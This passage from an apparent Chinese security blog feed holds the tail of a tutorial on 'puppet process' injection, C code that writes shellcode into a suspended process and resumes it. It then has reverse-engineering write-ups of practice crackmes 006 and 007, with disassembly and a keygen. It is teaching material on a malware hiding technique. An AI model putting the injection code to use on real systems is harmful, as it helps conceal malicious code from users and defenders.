CONTEXT_FULL;<br>Flag = GetThreadContext(pi.hThread, &amp;threadContext);<br><span class="hljs-keyword">if</span> (Flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取线程上下文失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 拿到目标进程主线程上下文后，在Ebx寄存器中保存的就是PEB的地址，</span><br><span class="hljs-comment">// 而PEB结构偏移0x8的位置是AddressOfImageBase字段，</span><br><span class="hljs-comment">// 所以直接来读取ctx.Ebx+0x8，就可以获取到目标进程的加载基址</span><br>LPVOID lpBuffer = <span class="hljs-number">0</span>;<br>Flag = ReadProcessMemory(pi.hProcess, (LPVOID)(threadContext.Ebx + <span class="hljs-number">0x8</span>), &amp;lpBuffer, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (Flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;读取内存数据失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//写入shellcode</span><br>Flag = WriteProcessMemory(pi.hProcess, (LPVOID)threadContext.Eax, data, <span class="hljs-keyword">sizeof</span>(data), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (Flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写入数据失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//恢复执行</span><br>ResumeThread(pi.hThread);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行程序可以看到成功弹出shellcode 的内容。</p><p><img src="/2021/08/03/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/1.png"></p><p>使用任务管理器查看可以看到傀儡进程。</p><p><img src="/2021/08/03/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/2.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>《Windows黑客编程技术详解》</p><p><a href="https://blog.csdn.net/cssxn/article/details/97645162">创建傀儡进程代码</a></p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>隐藏技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-007</title>
    <link href="/2021/08/03/160CrackMe-007/"/>
    <url>/2021/08/03/160CrackMe-007/</url>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序还是和上一个有很熟悉的画面，不愧是同一个作者做的。</p><p><img src="/2021/08/03/160CrackMe-007/1.png"></p><p>about按钮了解情况，还是需要让按钮消失然后露出logo就算成功了。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>无壳，是使用delphi编写的。</p><p><img src="/2021/08/03/160CrackMe-007/2.png"></p><p>还是直接使用DeDark查看，然后去下断</p><p><img src="/2021/08/03/160CrackMe-007/3.png"></p><p>断下来之后进行分析，可以看到一个较为关键的跳转，在此之前的函数比较重要，进去查看一下。</p><p><img src="/2021/08/03/160CrackMe-007/4.png"></p><p>进来之后果然看到了算法</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">004429EE  |.  <span class="hljs-number">8945</span> F4       <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xC</span>],<span class="hljs-built_in">eax</span><br>004429F1  |.  BE <span class="hljs-number">01000000</span>   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>,<span class="hljs-number">0x1</span><br>004429F6  |&gt;  8B45 F8       /<span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8</span>]<br>004429F9  |.  E8 3610FCFF   |<span class="hljs-keyword">call</span> aLoNg3x_<span class="hljs-number">.</span>00403A34<br>004429FE  |.  83F8 <span class="hljs-number">01</span>       |<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x1</span><br>00442A01  |.  7C <span class="hljs-number">1D</span>         |<span class="hljs-keyword">jl</span> short aLoNg3x_<span class="hljs-number">.</span>00442A20<br>00442A03  |&gt;  8B55 F8       |/<span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8</span>]<br>00442A06  |.  0FB65432 FF   ||<span class="hljs-keyword">movzx</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-built_in">edx</span>+<span class="hljs-built_in">esi</span>-<span class="hljs-number">0x1</span>]<br>00442A0B  |.  8B4D F8       ||<span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8</span>]<br>00442A0E  |.  0FB64C01 FF   ||<span class="hljs-keyword">movzx</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-built_in">ecx</span>+<span class="hljs-built_in">eax</span>-<span class="hljs-number">0x1</span>]<br>00442A13  |.  0FAFD1        ||<span class="hljs-keyword">imul</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">ecx</span><br>00442A16  |.  0FAFD7        ||<span class="hljs-keyword">imul</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">edi</span><br>00442A19  |.  03DA          ||<span class="hljs-keyword">add</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">edx</span><br>00442A1B  |.  <span class="hljs-number">48</span>            ||<span class="hljs-keyword">dec</span> <span class="hljs-built_in">eax</span><br>00442A1C  |.  85C0          ||<span class="hljs-keyword">test</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>00442A1E  |.^ <span class="hljs-number">75</span> E3         |\<span class="hljs-keyword">jnz</span> short aLoNg3x_<span class="hljs-number">.</span>00442A03<br>00442A20  |&gt;  <span class="hljs-number">46</span>            |<span class="hljs-keyword">inc</span> <span class="hljs-built_in">esi</span><br>00442A21  |.  FF4D F4       |<span class="hljs-keyword">dec</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xC</span>]<br>00442A24  |.^ <span class="hljs-number">75</span> D0         \<span class="hljs-keyword">jnz</span> short aLoNg3x_<span class="hljs-number">.</span>004429F6<br>00442A26  |&gt;  8BC3          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">ebx</span><br>00442A28  |.  <span class="hljs-number">99</span>            <span class="hljs-keyword">cdq</span><br>00442A29  |.  33C2          <span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">edx</span><br>00442A2B  |.  2BC2          <span class="hljs-keyword">sub</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">edx</span><br>00442A2D  |.  B9 2A2C0A00   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-number">0xA2C2A</span><br>00442<span class="hljs-built_in">A32</span>  |.  <span class="hljs-number">99</span>            <span class="hljs-keyword">cdq</span><br>00442A33  |.  F7F9          <span class="hljs-keyword">idiv</span> <span class="hljs-built_in">ecx</span><br>00442A35  |.  8BDA          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">edx</span><br>00442A37  |.  8B45 FC       <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>]<br>00442A3A  |.  B9 <span class="hljs-number">59000000</span>   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-number">0x59</span><br>00442A3F  |.  <span class="hljs-number">99</span>            <span class="hljs-keyword">cdq</span><br>00442A40  |.  F7F9          <span class="hljs-keyword">idiv</span> <span class="hljs-built_in">ecx</span><br>00442A42  |.  8BC8          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">eax</span><br>00442A44  |.  8B45 FC       <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>]<br>00442A47  |.  BE <span class="hljs-number">50000000</span>   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>,<span class="hljs-number">0x50</span><br>00442A4C  |.  <span class="hljs-number">99</span>            <span class="hljs-keyword">cdq</span><br>00442A4D  |.  F7FE          <span class="hljs-keyword">idiv</span> <span class="hljs-built_in">esi</span><br>00442A4F  |.  03CA          <span class="hljs-keyword">add</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">edx</span><br>00442A51  |.  <span class="hljs-number">41</span>            <span class="hljs-keyword">inc</span> <span class="hljs-built_in">ecx</span><br>00442A52  |.  <span class="hljs-number">894D</span> FC       <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>],<span class="hljs-built_in">ecx</span><br>00442A55  |.  3B5D FC       <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>]<br></code></pre></div></td></tr></table></figure><p>但是问题是，其中edi的值一直为0，这导致一直在计算的值都是0，然后再进行比较，是不可以的，必须要找到edi在何处被赋值。</p><p><img src="/2021/08/03/160CrackMe-007/5.png"></p><p>往上慢慢寻找一下，可以看到此处edi的值是通过eax赋值的，那么又要寻找eax的值，函数内部没有，需要出去函数寻找。</p><p><img src="/2021/08/03/160CrackMe-007/6.png"></p><p>出函数之后，看到eax的值是通过一个地址传递的</p><p><img src="/2021/08/03/160CrackMe-007/7.png"></p><p>继续找寻此地址的值是从何处得来，下硬件断点，没有断下来，说明不满足条件，不过在上面不远处就可以看到这个地址的赋值。看到如果想要进入此处需要让上面的JZ跳转不跳走，进入前面的函数看看</p><p><img src="/2021/08/03/160CrackMe-007/8.png"></p><p>进去发现是一个判断你输入的codice中是否含有非数字的一个判断，但是其中又有一点限制，就是第一位如果输入-，+，$，X，x，剩下都是数字的话，也是可以的，反正就是，输入非纯数字的codice以便可以进入后面，如果输入第一位为以上几个的话，那么其中还需要至少再含有一个非数字就可以。</p><p><img src="/2021/08/03/160CrackMe-007/9.png"></p><p>继续分析，再赋值前一条语句的函数就是关键的生成函数，进入分析，发现算法。</p><figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima"><span class="hljs-number">00442ACD</span>  |.  B9 <span class="hljs-number">01000000</span>   mov ecx,<span class="hljs-number">0x1</span><br><span class="hljs-number">00442AD2</span>  |&gt;  <span class="hljs-number">8B45</span> FC       /mov eax,dword ptr ss:[ebp-<span class="hljs-number">0x4</span>]<br><span class="hljs-number">00442AD5</span>  |.  <span class="hljs-number">0FB60408</span>      |movzx eax,byte ptr ds:[eax+ecx]<br><span class="hljs-number">00442AD9</span>  |.  BF <span class="hljs-number">11000000</span>   |mov edi,<span class="hljs-number">0x11</span><br><span class="hljs-number">00442ADE</span>  |.  33D2          |xor edx,edx<br><span class="hljs-number">00442AE0</span>  |.  F7F7          |div edi<br><span class="hljs-number">00442AE2</span>  |.  <span class="hljs-number">42</span>            |inc edx<br><span class="hljs-number">00442AE3</span>  |.  <span class="hljs-number">8B45</span> FC       |mov eax,dword ptr ss:[ebp-<span class="hljs-number">0x4</span>]<br><span class="hljs-number">00442AE6</span>  |.  <span class="hljs-number">0FB64408</span> FF   |movzx eax,byte ptr ds:[eax+ecx-<span class="hljs-number">0x1</span>]<br><span class="hljs-number">00442AEB</span>  |.  <span class="hljs-number">0FAFD0</span>        |imul edx,eax<br><span class="hljs-number">00442AEE</span>  |.  <span class="hljs-number">03F2</span>          |add esi,edx<br><span class="hljs-number">00442AF0</span>  |.  <span class="hljs-number">41</span>            |inc ecx                                 ;  user32.75B16D51<br><span class="hljs-number">00442AF1</span>  |.  4B            |dec ebx<br><span class="hljs-number">00442AF2</span>  |.^ <span class="hljs-number">75</span> DE         \jnz short aLoNg3x_.<span class="hljs-number">00442AD2</span><br><span class="hljs-number">00442AF4</span>  |.  EB <span class="hljs-number">02</span>         jmp short aLoNg3x_.<span class="hljs-number">00442AF8</span><br><span class="hljs-number">00442AF6</span>  |&gt;  33F6          xor esi,esi<br><span class="hljs-number">00442AF8</span>  |&gt;  8BC6          mov eax,esi<br><span class="hljs-number">00442AFA</span>  |.  B9 <span class="hljs-number">48710000</span>   mov ecx,<span class="hljs-number">0x7148</span><br><span class="hljs-number">00442AFF</span>  |.  <span class="hljs-number">99</span>            cdq<br><span class="hljs-number">00442B00</span>  |.  F7F9          idiv ecx                                 ;  user32.75B16D51<br><span class="hljs-number">00442B02</span>  |.  8BC2          mov eax,edx<br><span class="hljs-number">00442B04</span>  |.  <span class="hljs-number">99</span>            cdq<br><span class="hljs-number">00442B05</span>  |.  33C2          xor eax,edx                              ;  XOR0<br><span class="hljs-number">00442B07</span>  |.  2BC2          sub eax,edx                              ;  -<span class="hljs-number">0</span><br><span class="hljs-number">00442B09</span>  |.  8BD8          mov ebx,eax<br><span class="hljs-number">00442B0B</span>  |.  33C0          xor eax,eax<br></code></pre></div></td></tr></table></figure><p>这里会生成一个标志值，用于后面的计算</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szCodice);<br><span class="hljs-keyword">int</span> remainder;<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0x37B</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; len ; i++) &#123;<br>remainder = szCodice[i] % <span class="hljs-number">0x11</span> + <span class="hljs-number">1</span>;<br>sum += remainder * szCodice[i - <span class="hljs-number">1</span>];<br>&#125;<br>sum = sum % <span class="hljs-number">0x7148</span>;<br><span class="hljs-keyword">return</span> sum;<br></code></pre></div></td></tr></table></figure><p>生成标志值之后就可以继续刚才的算法计算了，</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szName);<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= len; i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt;= len; j++) &#123;<br>sum += (szName[i] * szName[len - j]) * FlagNumber;<br>&#125;<br>&#125;<br>__asm &#123;<br>mov eax,sum<br>cdq<br><span class="hljs-keyword">xor</span> eax,edx<br>sub eax,edx<br>mov ecx,<span class="hljs-number">0xA2C2A</span><br>cdq<br>idiv ecx<br>mov ebx,edx<br>mov sum,ebx<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0xFFFFFFFF</span>; i++) &#123;<br><span class="hljs-keyword">if</span> (((i / <span class="hljs-number">0x59</span>) + (i % <span class="hljs-number">0x50</span>) + <span class="hljs-number">1</span>) == sum) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;codice:%d\n&quot;</span>, i);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>到这里算出了一个可以用的codice</p><p><img src="/2021/08/03/160CrackMe-007/11.png"></p><p>输入后发现又出现了一个again按钮。</p><p><img src="/2021/08/03/160CrackMe-007/10.png"></p><p>从dedark中找到againClick事件，经过分析发现其实是和OK按钮一模一样的流程，也就是把刚才输入的在输入一次就好了</p><p><img src="/2021/08/03/160CrackMe-007/12.png"></p><h4 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h4><p>完整注册机如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-comment">//字母</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getFlagNumber</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* szCodice)</span> </span>&#123;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szCodice);<br><span class="hljs-keyword">int</span> remainder;<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0x37B</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; len ; i++) &#123;<br>remainder = szCodice[i] % <span class="hljs-number">0x11</span> + <span class="hljs-number">1</span>;<br>sum += remainder * szCodice[i - <span class="hljs-number">1</span>];<br>&#125;<br>sum = sum % <span class="hljs-number">0x7148</span>;<br><span class="hljs-keyword">return</span> sum;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">OkClick</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* szName,<span class="hljs-keyword">int</span> FlagNumber)</span> </span>&#123;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szName);<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= len; i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt;= len; j++) &#123;<br>sum += (szName[i] * szName[len - j]) * FlagNumber;<br>&#125;<br>&#125;<br>__asm &#123;<br>mov eax,sum<br>cdq<br><span class="hljs-keyword">xor</span> eax,edx<br>sub eax,edx<br>mov ecx,<span class="hljs-number">0xA2C2A</span><br>cdq<br>idiv ecx<br>mov ebx,edx<br>mov sum,ebx<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0xFFFFFFFF</span>; i++) &#123;<br><span class="hljs-keyword">if</span> (((i / <span class="hljs-number">0x59</span>) + (i % <span class="hljs-number">0x50</span>) + <span class="hljs-number">1</span>) == sum) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;codice:%d\n&quot;</span>, i);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请先输入第一位是字母的Codice以便生成标志值\n&quot;</span>);<br><span class="hljs-keyword">char</span> Codice[<span class="hljs-number">20</span>];<br>gets_s(Codice, <span class="hljs-number">20</span>);<br><span class="hljs-keyword">int</span> FlagNumber = getFlagNumber(Codice);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入用户名\n&quot;</span>);<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>gets_s(name, <span class="hljs-number">20</span>);<br>OkClick(name, FlagNumber);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个程序就是需要先输入非纯数字codice生成一个标志值计算，然后再输入codice就可以了，连续两次即可。注册机那段内联汇编，实在不知道怎么用C写了…</p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-006</title>
    <link href="/2021/08/02/160CrackMe-006/"/>
    <url>/2021/08/02/160CrackMe-006/</url>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序如下看到OK是不可点击的，是一个灰色按钮。</p><p><img src="/2021/08/02/160CrackMe-006/1.png"></p><p>点击about查看一下，可以看到我们需要让两个按钮都消失以便可以看到Ringzer0的logo</p><p><img src="/2021/08/02/160CrackMe-006/2.png"></p><p>那么先想办法让OK变得可以点击吧。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>查看壳，发现未加壳，是用Delphi写的</p><p><img src="/2021/08/02/160CrackMe-006/3.png"></p><p>使用API断点，给IsEnableWindow下断，但是发现怎么都无法断下来，说明肯定是有条件的，而当前还没有满足这个条件。</p><p>使用dedark工具帮忙查看，直接分析真的是太难找了，可以看到主要四个事件，这四个事件应该比较关键</p><p><img src="/2021/08/02/160CrackMe-006/4.png"></p><p>根据函数地址找到函数下好断点之后，查看可以发现nomechange和codicechange几乎是一样的，将两处明显的跳转更改条件使跳转失效，让程序跑起来后都会断在之前下的API断点上。那么它们都是比较关键的地方。</p><p>第一个关键跳转都是判断eax+0x47这个地址的值是否等于0，而第二个跳转都是先调用了00442A3C这个函数。</p><p>nomechange：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00442E04</span>  /.  <span class="hljs-number">55</span>            push ebp                                 ;  nomeChange<br><span class="hljs-attribute">00442E05</span>  |.  <span class="hljs-number">8</span>BEC          mov ebp,esp<br><span class="hljs-attribute">00442E07</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442E09</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442E0B</span>  |.  <span class="hljs-number">53</span>            push ebx<br><span class="hljs-attribute">00442E0C</span>  |.  <span class="hljs-number">8</span>BD<span class="hljs-number">8</span>          mov ebx,eax<br><span class="hljs-attribute">00442E0E</span>  |.  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442E10</span>  |.  <span class="hljs-number">55</span>            push ebp<br><span class="hljs-attribute">00442E11</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">9</span>B<span class="hljs-number">2</span>E<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">9</span>B<br><span class="hljs-attribute">00442E16</span>  |.  <span class="hljs-number">64</span>:FF<span class="hljs-number">30</span>       push dword ptr fs:[eax]<br><span class="hljs-attribute">00442E19</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8920</span>       mov dword ptr fs:[eax],esp<br><span class="hljs-attribute">00442E1C</span>  |.  <span 